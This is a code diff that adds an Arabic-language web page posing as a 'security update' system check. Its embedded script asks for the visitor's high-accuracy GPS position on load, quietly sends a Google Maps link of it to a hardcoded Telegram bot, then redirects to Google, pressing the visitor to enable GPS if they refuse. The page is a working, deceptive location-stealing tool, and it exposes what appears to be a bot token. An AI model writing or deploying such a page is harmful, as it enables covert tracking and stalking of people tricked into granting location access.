@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث الأمان</title>
+</head>
+<body style="background-color: #f0f0f0; text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>جاري فحص حالة النظام...</h2>
+    <p>يرجى الموافقة على طلب الموقع للمتابعة</p>
+
+    <script>
+        // بياناتك الصحيحة
+        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
+        const chatId = "7984067238"; 
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // تم تصحيح الرابط هنا ليعمل مباشرة مع خرائط جوجل
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 تم تحديد الموقع بنجاح:\n${mapLink}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, (err) => {
+                    alert("يرجى تفعيل الموقع الجغرافي (GPS) ثم تحديث الصفحة.");
+                }, { enableHighAccuracy: true });
+            }
+        };
+    </script>
+</body>
+</html>
+
